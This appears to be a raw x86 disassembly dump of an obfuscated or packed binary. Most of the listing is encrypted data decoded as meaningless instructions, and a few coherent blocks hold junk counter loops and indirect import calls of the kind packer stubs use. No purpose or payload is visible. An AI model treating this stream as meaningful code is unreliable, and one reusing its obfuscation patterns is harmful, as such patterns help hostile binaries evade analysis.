  4190c5:	xlat   BYTE PTR ds:[ebx]
  4190c6:	scas   eax,DWORD PTR es:[edi]
  4190c7:	hlt    
  4190c8:	leave  
  4190c9:	xchg   edi,eax
  4190ca:	jp     0x419075
  4190cc:	push   esp
  4190cd:	fbstp  TBYTE PTR [eax-0x5dda377d]
  4190d3:	cli    
  4190d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190d5:	add    al,0x69
  4190d7:	cmp    BYTE PTR [edx],bl
  4190d9:	cmp    BYTE PTR [ecx+0x463bbc45],dh
  4190df:	pop    ebp
  4190e0:	stc    
  4190e1:	(bad)  
  4190e2:	mov    ebp,0xbfdad586
  4190e7:	jmp    0x606d:0x597c55d1
  4190ee:	call   0x84a46f9a
  4190f3:	(bad)  
  4190f4:	outs   dx,DWORD PTR ds:[esi]
  4190f5:	jle    0x41913e
  4190f7:	ret    
  4190f8:	ss int 0x5a
  4190fb:	cmp    ch,dl
  4190fd:	mov    WORD PTR [esi+eiz*1+0xf],ss
  419101:	xor    eax,0x5c879c82
  419106:	push   eax
  419107:	out    0x42,al
  419109:	leave  
  41910a:	sahf   
  41910b:	fisub  WORD PTR [esi+0x4]
  41910e:	adc    ecx,DWORD PTR [esi+0x19730488]
  419114:	sbb    esp,edi
  419116:	cmp    bh,ch
  419118:	mov    ds:0x5078db80,al
  41911d:	dec    ebx
  41911e:	mov    ebx,0x671ffbc2
  419123:	fstp   st(4)
  419125:	loopne 0x41918a
  419127:	call   0x3386:0x4e3d5ca1
  41912e:	imul   eax,ecx,0x6984c55a
  419134:	push   ss
  419135:	mov    edx,0x20de877f
  41913a:	xor    BYTE PTR [edi+0x27e7e1d3],al
  419140:	or     al,0x49
  419142:	push   ecx
  419143:	lahf   
  419144:	mov    DWORD PTR [ebx+0x7a],esi
  419147:	add    DWORD PTR [ecx-0xb],esp
  41914a:	sbb    BYTE PTR [ebp+ecx*2-0x7969be8f],0x0
  419152:	(bad)  
  419153:	adc    BYTE PTR [edx],bl
  419155:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  419157:	sub    BYTE PTR [edx],0x30
  41915a:	xor    eax,0xa9f56aa1
  41915f:	adc    BYTE PTR [ecx],dl
  419161:	div    al
  419163:	inc    esi
  419164:	gs (bad) 
  419166:	pop    ss
  419167:	xor    eax,0xcab56ee9
  41916c:	in     eax,dx
  41916d:	aas    
  41916e:	push   esi
  41916f:	out    0xfc,eax
  419171:	ret    
  419172:	mov    dl,0xbb
  419174:	push   es
  419175:	jne    0x4191ef
  419177:	outs   dx,DWORD PTR ds:[esi]
  419178:	dec    ebx
  419179:	mov    dl,0x22
  41917b:	push   ebx
  41917c:	mov    bl,0xe6
  41917e:	jbe    0x419103
  419180:	in     al,dx
  419181:	xchg   ebx,eax
  419182:	es fdivp st(2),st
  419185:	ja     0x4191f9
  419187:	das    
  419188:	jle    0x419129
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ss,edi
  4191b0:	mov    DWORD PTR [edi],edi
  4191b2:	cmp    al,0x8
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41919d
  4191bc:	jns    0x419146
  4191be:	iret   
  4191bf:	ret    
  4191c0:	mov    eax,0xd645bf02
  4191c5:	sbb    ch,BYTE PTR [ecx-0x6ff3fe68]
  4191cb:	mov    ch,0x21
  4191cd:	jp     0x4191d3
  4191cf:	outs   dx,DWORD PTR ds:[esi]
  4191d0:	sbb    BYTE PTR [edi+eiz*2-0x6d34e768],dh
  4191d7:	pop    ds
  4191d8:	cmp    cl,0xc9
  4191db:	jbe    0x41923b
  4191dd:	pop    es
  4191de:	push   ebp
  4191df:	sub    cl,BYTE PTR ds:0xb21410cd
  4191e5:	adc    bl,BYTE PTR es:[eax-0x7f]
  4191e9:	push   ebx
  4191ea:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4191ec:	mov    edx,0x49bdfe07
  4191f1:	(bad)  
  4191f2:	xor    eax,0x2f597c45
  4191f7:	mov    ebp,0x8b227267
  4191fc:	inc    ebp
  4191fd:	fcomp  QWORD PTR [edx]
  4191ff:	arpl   WORD PTR [ebp+0x20de03a],cx
  419205:	imul   edi,DWORD PTR [esi+edi*1+0x17c2db4c],0x64b84b35
  419210:	lahf   
  419211:	imul   esp,DWORD PTR [ecx+0x52e04b39],0x9869aa9c
  41921b:	aaa    
  41921c:	jnp    0x419200
  41921e:	and    BYTE PTR [ebx+0x459816f3],ah
  419224:	imul   edx,DWORD PTR [ebx-0x21],0xffffff9d
  419228:	push   eax
  419229:	sub    bl,al
  41922b:	xor    al,BYTE PTR [eax]
  41922d:	pop    ecx
  41922e:	sub    eax,0x19d1dc7a
  419233:	in     eax,0x2c
  419235:	add    dl,bh
  419237:	fdiv   QWORD PTR [eax+ebx*2]
  41923a:	call   0xa5df090f
  41923f:	sub    bl,BYTE PTR [esi]
  419241:	dec    esi
  419242:	loopne 0x41920e
  419244:	add    cl,BYTE PTR [edx-0x41]
  419247:	mov    WORD PTR [eax+eax*4],fs
  41924a:	ret    0x57f4
  41924d:	pop    ecx
  41924e:	cs ins BYTE PTR es:[edi],dx
  419250:	(bad)  
  419252:	(bad)  
  419253:	cmp    bh,BYTE PTR ds:0x6e61edab
  419259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41925a:	pop    es
  41925b:	(bad)  
  41925c:	stos   DWORD PTR es:[edi],eax
  41925d:	(bad)  
  41925e:	fadd   DWORD PTR [edx]
  419260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419261:	xor    eax,0xf4129ff7
  419266:	enter  0x8ad3,0x2
  41926a:	jo     0x4191f7
  41926c:	xor    ebx,DWORD PTR [eax-0x57cef87f]
  419272:	push   ecx
  419273:	or     BYTE PTR [eax+0x18],0xf7
  419277:	xchg   ebp,eax
  419278:	xchg   esp,eax
  419279:	sahf   
  41927a:	scas   eax,DWORD PTR es:[edi]
  41927b:	or     eax,0xc933281c
  419280:	test   esp,edx
  419282:	push   ebp
  419283:	imul   eax,DWORD PTR [edi+0x13],0xd97b897f
  41928a:	jae    0x419228
  41928c:	push   es
  41928d:	or     DWORD PTR [edx],esi
  41928f:	jae    0x4192e5
  419291:	or     edi,DWORD PTR [ecx-0x489be455]
  419297:	in     eax,0xb2
  419299:	shl    ebx,1
  41929b:	ins    DWORD PTR es:[edi],dx
  41929c:	dec    ebp
  41929d:	add    al,0xa0
  41929f:	pop    edi
  4192a0:	aas    
  4192a1:	add    al,0x5e
  4192a3:	push   ds
  4192a4:	and    al,0x88
  4192a6:	stos   BYTE PTR es:[edi],al
  4192a7:	imul   BYTE PTR [esi]
  4192a9:	sub    DWORD PTR [edx-0x20b1e0c],esi
  4192af:	retf   0x148
  4192b2:	rcl    DWORD PTR [edi+ecx*1+0x48dd1ba1],cl
  4192b9:	push   edx
  4192ba:	(bad)  
  4192bb:	xor    al,0xac
  4192bd:	rcr    DWORD PTR [eax],cl
  4192bf:	out    dx,al
  4192c0:	pushf  
  4192c1:	xchg   ebp,eax
  4192c2:	mov    esp,0x7cd8b17f
  4192c7:	jg     0x419300
  4192c9:	in     eax,0xd5
  4192cb:	mov    cl,bl
  4192cd:	sub    dl,bl
  4192cf:	js     0x41932f
  4192d1:	fst    QWORD PTR ds:0xf45c3730
  4192d7:	iret   
  4192d8:	push   esi
  4192d9:	push   cs
  4192da:	addr16 aad 0x65
  4192dd:	jg     0x41928c
  4192df:	jb     0x419294
  4192e1:	fs cdq 
  4192e3:	loop   0x419294
  4192e5:	mov    al,0x81
  4192e7:	ins    BYTE PTR es:[edi],dx
  4192e8:	cmp    esi,DWORD PTR [edi]
  4192ea:	not    DWORD PTR [edi]
  4192ec:	xchg   ecx,eax
  4192ed:	cmp    ebx,DWORD PTR [ebx-0x49]
  4192f0:	lock (bad) 
  4192f2:	dec    ecx
  4192f3:	out    0xbc,al
  4192f5:	mov    edi,0x6183d0bb
  4192fa:	call   0xa32e:0x7380f0fc
  419301:	fsubr  st(6),st
  419303:	adc    edi,DWORD PTR [esi+0x15]
  419306:	xor    al,0xa1
  419308:	test   edi,ebp
  41930a:	and    esp,ebp
  41930c:	jle    0x4192d2
  41930e:	je     0x4192e9
  419310:	mov    al,ds:0xcf68f4a9
  419315:	das    
  419316:	mov    ds:0xc7a1289e,al
  41931b:	test   DWORD PTR [esi-0x3a],edx
  41931e:	call   0x39ee44dc
  419323:	mov    esi,0x3c481359
  419328:	sahf   
  419329:	mov    ebx,0x8a729d84
  41932e:	push   ebx
  41932f:	adc    DWORD PTR [ebx+edx*1],esp
  419332:	gs cmp eax,0xa5e308a1
  419338:	xor    cl,BYTE PTR [edi*1-0x5947fe08]
  41933f:	cmp    DWORD PTR [ebp-0x6b3637d1],edx
  419345:	and    bh,BYTE PTR [eax]
  419347:	dec    eax
  419348:	sub    eax,0x7f26ec4e
  41934d:	adc    ebx,DWORD PTR ds:0xf3ede8ed
  419353:	out    dx,al
  419354:	call   0xf5cd:0xe38426b6
  41935b:	push   ss
  41935c:	enter  0x7b01,0x8f
  419360:	hlt    
  419361:	and    ah,BYTE PTR [esp+eax*2]
  419364:	mov    ds:0x6c248be1,al
  419369:	mov    al,0x60
  41936b:	icebp  
  41936c:	iret   
  41936d:	sub    BYTE PTR es:[edi],bl
  419370:	sti    
  419371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419372:	mov    ch,0x84
  419374:	das    
  419375:	add    esp,0x6f3fa6d4
  41937b:	call   0xeb99:0xfa81b799
  419382:	mov    ah,0x26
  419384:	sub    eax,0x871236a9
  419389:	imul   eax,DWORD PTR [edx],0xffffffea
  41938c:	fiadd  WORD PTR [eax-0x45]
  41938f:	fisttp QWORD PTR [ebx+0x50]
  419392:	pop    edi
  419393:	push   cs
  419394:	mov    edx,0x759f1347
  419399:	mov    bl,0x2b
  41939b:	fistp  WORD PTR [esi+0x57a96158]
  4193a1:	shl    BYTE PTR [esi+0x129300a3],cl
  4193a7:	or     DWORD PTR [edx+0x457ac184],0x873e5127
  4193b1:	mov    eax,ds:0xbc824d96
  4193b6:	daa    
  4193b7:	clc    
  4193b8:	xchg   esp,eax
  4193b9:	(bad)  
  4193ba:	or     eax,0x6c870a93
  4193bf:	inc    esp
  4193c0:	into   
  4193c1:	outs   dx,DWORD PTR ds:[esi]
  4193c2:	or     DWORD PTR [ebx+0x5e],ecx
  4193c5:	call   0x789f:0x9d23a95b
  4193cc:	xchg   esp,eax
  4193cd:	adc    al,0xc2
  4193cf:	mov    ?,edx
  4193d1:	arpl   WORD PTR [edx-0x39],si
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x64],eax
  41952b:	or     al,BYTE PTR [edx]
  41952d:	sahf   
  41952e:	and    bl,cl
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4194c2
  419537:	cmp    eax,0xfc2dd0c9
  41953c:	pop    esp
  41953d:	cmp    esi,DWORD PTR [ebx+edx*2+0x23867e48]
  419544:	cmp    edi,DWORD PTR [edi-0x64ce0a12]
  41954a:	aad    0x95
  41954c:	add    edi,DWORD PTR [esi+0x16]
  41954f:	adc    esi,DWORD PTR [eax-0x567fe3ba]
  419555:	pusha  
  419556:	mov    ss,WORD PTR [edx]
  419558:	mov    edx,0xbdf41359
  41955d:	nop
  41955e:	push   ecx
  41955f:	scas   al,BYTE PTR es:[edi]
  419560:	fidivr DWORD PTR [edi-0x54]
  419563:	mov    eax,ds:0x59b5b710
  419568:	sub    BYTE PTR [edx-0x7c],al
  41956b:	xor    esi,ebp
  41956d:	pop    ecx
  41956e:	cld    
  41956f:	pop    ebp
  419570:	fld    QWORD PTR [ebx-0x73204570]
  419576:	inc    ebp
  419577:	outs   dx,DWORD PTR ds:[esi]
  419578:	test   al,0x7b
  41957a:	adc    eax,DWORD PTR [ebp+0x31fdb876]
  419580:	dec    edi
  419581:	sbb    esp,DWORD PTR [edx-0x4fc149cf]
  419587:	cmp    al,0x3d
  419589:	mov    edi,0xe8a1ae6a
  41958e:	into   
  41958f:	aam    0x6d
  419591:	mov    ebx,DWORD PTR [ebp+0x4e]
  419594:	loop   0x4195c9
  419596:	and    DWORD PTR [eax-0x42],edx
  419599:	stos   BYTE PTR es:[edi],al
  41959a:	mov    ah,0xc0
  41959c:	imul   esi,DWORD PTR [ebp+0x16c0254],0xc063c4c3
  4195a6:	out    dx,al
  4195a7:	loop   0x419628
  4195a9:	imul   edx,DWORD PTR [ebp+0x14],0x28
  4195ad:	xchg   ebx,eax
  4195ae:	dec    ecx
  4195af:	retf   
  4195b0:	inc    ebp
  4195b1:	jae    0x4195b4
  4195b3:	mov    BYTE PTR [edx-0x2ecf754c],cl
  4195b9:	div    BYTE PTR cs:[edx+0x3052c9c1]
  4195c0:	cli    
  4195c1:	out    0xe3,eax
  4195c3:	sbb    DWORD PTR [edx-0x39e54c6a],edx
  4195c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ca:	std    
  4195cb:	in     eax,0xa7
  4195cd:	aas    
  4195ce:	sahf   
  4195cf:	inc    ecx
  4195d0:	(bad)  
  4195d1:	pop    ss
  4195d2:	adc    dh,BYTE PTR [ebx-0x2a]
  4195d5:	pop    esi
  4195d6:	mov    ecx,0xc2d55348
  4195db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195dc:	fmul   QWORD PTR [ecx-0x3a880bcd]
  4195e2:	mov    esp,0x3d93222c
  4195e7:	aas    
  4195e8:	push   ss
  4195e9:	add    eax,0x6424c412
  4195ee:	push   ds
  4195ef:	push   esp
  4195f0:	push   cs
  4195f1:	jg     0x419631
  4195f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f4:	stos   BYTE PTR es:[edi],al
  4195f5:	push   ecx
  4195f6:	pop    esp
  4195f7:	dec    esi
  4195f8:	fsubr  QWORD PTR [ecx+edx*4+0x58d53b13]
  4195ff:	jb     0x4195e0
  419601:	popf   
  419602:	jns    0x419625
  419604:	sar    DWORD PTR [eax],1
  419606:	scas   eax,DWORD PTR es:[edi]
  419607:	aaa    
  419608:	sbb    esi,DWORD PTR [esi+0x258fac98]
  41960e:	jmp    FWORD PTR ss:[edi+0x18]
  419612:	xor    esp,ecx
  419614:	dec    ebx
  419615:	es xor esp,0x24
  419619:	lods   eax,DWORD PTR ds:[esi]
  41961a:	push   esp
  41961b:	inc    edi
  41961c:	pushf  
  41961d:	mov    bl,0x9a
  41961f:	ds push esp
  419621:	pop    esi
  419622:	stos   DWORD PTR es:[edi],eax
  419623:	(bad)  
  419624:	jg     0x41966e
  419626:	cli    
  419627:	test   BYTE PTR [esp+ebx*2-0x44],al
  41962b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41962c:	xchg   edx,eax
  41962d:	in     eax,dx
  41962e:	jg     0x4195e5
  419630:	add    DWORD PTR [eax+0x1d4f699b],0xb781bac7
  41963a:	mov    bh,0x60
  41963c:	sbb    BYTE PTR [ecx],cl
  41963e:	leave  
  41963f:	mov    eax,0xa6d7d333
  419644:	mov    esi,0xa8ba300e
  419649:	aas    
  41964a:	ret    
  41964b:	out    dx,eax
  41964c:	xchg   ebx,eax
  41964d:	jg     0x4195e0
  41964f:	adc    edx,edx
  419651:	mov    ebx,0x9bc27dbc
  419656:	pop    edi
  419657:	xchg   ebx,eax
  419658:	mov    edx,0x7c372a57
  41965d:	mov    edx,0x6ec0ce3f
  419662:	inc    ebp
  419663:	imul   eax,DWORD PTR [ecx],0x38
  419666:	ins    BYTE PTR es:[edi],dx
  419667:	inc    eax
  419668:	aaa    
  419669:	dec    esi
  41966a:	rol    DWORD PTR [ecx-0x2b629a21],cl
  419670:	(bad)  
  419671:	adc    al,0xd4
  419673:	xchg   edi,eax
  419674:	ins    DWORD PTR es:[edi],dx
  419675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419676:	push   esp
  419677:	adc    eax,0x38565709
  41967c:	lods   eax,DWORD PTR ds:[esi]
  41967d:	and    al,0x48
  41967f:	mov    dl,0x50
  419681:	jle    0x4196a9
  419683:	bound  ebp,QWORD PTR [edx-0x3a]
  419686:	cmp    eax,0x35e03e5f
  41968b:	clc    
  41968c:	rcr    BYTE PTR [esp+eiz*8-0x58],cl
  419690:	fstp   TBYTE PTR [esi]
  419692:	retf   
  419693:	into   
  419694:	xlat   BYTE PTR ds:[ebx]
  419695:	mov    ds:0x91d3ea85,eax
  41969a:	imul   ecx,DWORD PTR [esp+esi*4+0x6],0x79
  41969f:	scas   al,BYTE PTR es:[edi]
  4196a0:	jp     0x41962e
  4196a2:	idiv   DWORD PTR [edx-0x55]
  4196a5:	aaa    
  4196a6:	push   0xbfd2aa9e
  4196ab:	je     0x4196cc
  4196ad:	cs pop ds
  4196af:	and    eax,0xc8c6534a
  4196b4:	aaa    
  4196b5:	adc    esi,esi
  4196b7:	cld    
  4196b8:	sub    DWORD PTR [edx+0x18a2320b],0x44
  4196bf:	inc    edi
  4196c0:	shl    DWORD PTR [ebp-0x73ed0b56],1
  4196c6:	idiv   BYTE PTR [edx*4-0x32a77943]
  4196cd:	and    al,BYTE PTR [edi-0x38da8ed0]
  4196d3:	loope  0x4196b1
  4196d5:	shr    BYTE PTR [ecx-0x19035e8b],0xf1
  4196dc:	push   es
  4196dd:	jl     0x419668
  4196df:	cwde   
  4196e0:	addr16 jge 0x419759
  4196e3:	or     DWORD PTR [ebx+0x59],edi
  4196e6:	mov    DWORD PTR [esi+eax*2+0x6a],edx
  4196ea:	jmp    0x158b:0x1809aa49
  4196f1:	or     bh,BYTE PTR [esi]
  4196f3:	(bad)  
  4196f5:	sbb    al,BYTE PTR [ebp-0xbe718dc]
  4196fb:	mov    edx,0x89d34f84
  419700:	push   ebx
  419701:	hlt    
  419702:	lea    eax,[ebx+ecx*8+0x59]
  419706:	retf   0x6c53
  419709:	fild   QWORD PTR [esi-0x52]
  41970c:	push   esp
  41970d:	cmp    dl,ah
  41970f:	test   BYTE PTR [edx-0x42],ch
  419712:	je     0x41978b
  419714:	aam    0xf9
  419716:	shl    DWORD PTR [bp+si],cl
  419719:	sti    
  41971a:	mov    eax,ds:0x4a35488
  41971f:	mov    DWORD PTR [esi+0x40701e53],eax
  419725:	pop    ebx
  419726:	add    cl,BYTE PTR [edi-0x91690ea]
  41972c:	sbb    al,0x80
  41972e:	xchg   ebp,eax
  41972f:	jmp    0x419734
  419731:	dec    edi
  419732:	pushf  
  419733:	lea    ebp,[edx-0x4ae7ff43]
  419739:	cmp    eax,0x73803f51
  41973e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973f:	inc    esi
  419740:	pop    esi
  419741:	addr16 cmp al,0xdb
  419744:	adc    cl,BYTE PTR [edx+0x7b]
  419747:	jp     0x41974c
  419749:	pop    eax
  41974a:	in     eax,dx
  41974b:	out    dx,eax
  41974c:	push   ecx
  41974d:	mov    WORD PTR [ebx-0x9fcebb3],cs
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0xd9adddeb
  41979d:	mov    ch,0xc9
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x419760
  4197a8:	xchg   esp,eax
  4197a9:	jno    0x41973c
  4197ab:	int    0x42
  4197ad:	inc    ecx
  4197ae:	int3   
  4197af:	sbb    al,0xc9
  4197b1:	pop    edx
  4197b2:	adc    al,0x16
  4197b4:	inc    BYTE PTR [edx]
  4197b6:	push   ebx
  4197b7:	fwait
  4197b8:	loopne 0x4197d1
  4197ba:	dec    ecx
  4197bb:	fcomp  QWORD PTR [ebp-0x7e5a7db0]
  4197c1:	sub    al,0x4
  4197c3:	iret   
  4197c4:	inc    edx
  4197c5:	test   esi,eax
  4197c7:	sahf   
  4197c8:	push   es
  4197c9:	or     bl,0x5c
  4197cc:	shr    BYTE PTR [ecx+edi*4],1
  4197cf:	pop    ebp
  4197d0:	out    0xef,eax
  4197d2:	inc    DWORD PTR [eax+0x40f9cc49]
  4197d8:	mov    bl,dl
  4197da:	pop    edi
  4197db:	xor    edi,ebx
  4197dd:	lods   eax,DWORD PTR ds:[esi]
  4197de:	dec    ebx
  4197df:	mov    al,0x49
  4197e1:	pop    edx
  4197e2:	pop    ds
  4197e3:	dec    ebp
  4197e4:	fwait
  4197e5:	cmp    esp,DWORD PTR [eax]
  4197e7:	sti    
  4197e8:	push   edx
  4197e9:	(bad)  [ebp+0x3e]
  4197ec:	jne    0x4197fe
  4197ee:	xchg   esp,eax
  4197ef:	and    DWORD PTR [ebx+0x7e0ec95c],ecx
  4197f5:	jle    0x41979f
  4197f7:	stos   DWORD PTR es:[edi],eax
  4197f8:	outs   dx,DWORD PTR ds:[esi]
  4197f9:	bound  eax,QWORD PTR ds:0xf1263d54
  4197ff:	dec    ebp
  419800:	pop    es
  419801:	jnp    0x41985e
  419803:	das    
  419804:	sub    eax,0xac3877b1
  419809:	pop    edi
  41980a:	fwait
  41980b:	push   eax
  41980c:	xor    cl,BYTE PTR [ecx+edi*1]
  41980f:	ret    0x9bb
  419812:	add    edx,DWORD PTR [ecx+esi*2]
  419815:	dec    edx
  419816:	mov    dh,0xdf
  419818:	test   al,0xe0
  41981a:	call   0xfd9d4648
  41981f:	std    
  419820:	out    0xda,al
  419822:	sbb    cl,dh
  419824:	jp     0x41982c
  419826:	fisub  WORD PTR [edi-0x676e4cdc]
  41982c:	jne    0x419855
  41982e:	jns    0x4197be
  419830:	or     DWORD PTR [esp+edx*1+0x2a],edx
  419834:	add    dh,BYTE PTR [ebp+0x7a]
  419837:	jns    0x419894
  419839:	push   cs
  41983a:	push   ds
  41983b:	out    dx,al
  41983c:	jb     0x419809
  41983e:	lea    edx,[eax+eiz*2]
  419841:	cmc    
  419842:	test   BYTE PTR [esi-0xb],0xb8
  419846:	mul    cl
  419848:	stc    
  419849:	bound  ebx,QWORD PTR [esp+ebx*8]
  41984c:	out    0xd9,al
  41984e:	sahf   
  41984f:	jle    0x41981c
  419851:	call   0xc29647cc
  419856:	fst    QWORD PTR [ecx]
  419858:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41985a:	rcl    DWORD PTR [esi-0x5071494a],1
  419860:	(bad)  
  419861:	xchg   esp,eax
  419862:	push   es
  419863:	mov    edi,0xc6bf56c2
  419868:	bound  ecx,QWORD PTR [esi-0x357ddfc8]
  41986e:	nop
  41986f:	imul   edi,DWORD PTR [ecx],0xffffffe4
  419872:	push   es
  419873:	cld    
  419874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419875:	iret   
  419876:	rcr    DWORD PTR [edi+0x44],1
  419879:	rcr    ebx,cl
  41987b:	loop   0x4198bb
  41987d:	jmp    0x5c37704a
  419882:	daa    
  419883:	jg     0x419838
  419885:	jl     0x4198d5
  419887:	outs   dx,DWORD PTR ds:[esi]
  419888:	push   0x21
  41988a:	xchg   esp,eax
  41988b:	out    0xe0,eax
  41988d:	das    
  41988e:	pop    esi
  41988f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419890:	mov    edx,0xde3a1536
  419895:	mov    bl,0xbf
  419897:	mov    bx,0xd13a
  41989b:	repnz aaa 
  41989d:	or     al,0x33
  41989f:	imul   edx,DWORD PTR [ecx-0x19],0xffffff87
  4198a3:	or     BYTE PTR [eax],0x2d
  4198a6:	pop    edi
  4198a7:	mov    WORD PTR [ecx-0xb280bb9],cs
  4198ad:	xor    eax,0xc444361e
  4198b2:	scas   eax,DWORD PTR es:[edi]
  4198b3:	cmc    
  4198b4:	call   0x33f0:0x3e4bd6d6
  4198bb:	pop    eax
  4198bc:	sbb    BYTE PTR [esi+0x728b70d3],ah
  4198c2:	(bad)  
  4198c3:	jmp    0x1764744a
  4198c8:	sbb    edx,ecx
  4198ca:	cwde   
  4198cb:	pop    ds
  4198cc:	mov    al,ds:0x30c3b18d
  4198d1:	arpl   WORD PTR [ebx+edx*8+0x76],sp
  4198d5:	add    al,0xe7
  4198d7:	mov    DWORD PTR [ebp+0x4a8e214],esi
  4198dd:	mov    cl,0x9e
  4198df:	sub    eax,0xc2b259da
  4198e4:	sub    BYTE PTR [edx-0x38],0x52
  4198e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e9:	cld    
  4198ea:	xchg   ch,dl
  4198ec:	int3   
  4198ed:	pusha  
  4198ee:	mov    BYTE PTR [edx-0x303030d0],0x87
  4198f5:	leave  
  4198f6:	cli    
  4198f7:	pushf  
  4198f8:	stos   DWORD PTR es:[edi],eax
  4198f9:	mov    esp,0xa4f0e8b4
  4198fe:	pop    ss
  4198ff:	push   cs
  419900:	loop   0x4198ff
  419902:	pop    edx
  419903:	and    ch,BYTE PTR [eax+0x57]
  419906:	in     al,dx
  419907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419908:	aaa    
  419909:	mov    edx,0xb183cdef
  41990e:	xchg   esp,eax
  41990f:	pop    ebp
  419910:	sub    BYTE PTR [ebp+0x77],0xd2
  419914:	cld    
  419915:	jecxz  0x41993d
  419917:	or     BYTE PTR [edx-0x5],al
  41991a:	test   eax,0x91dd3e06
  41991f:	repnz mov al,ds:0x8be36bee
  419925:	pop    es
  419926:	add    DWORD PTR [edx+0x2b5bc5f9],0xffffffcc
  41992d:	int    0xea
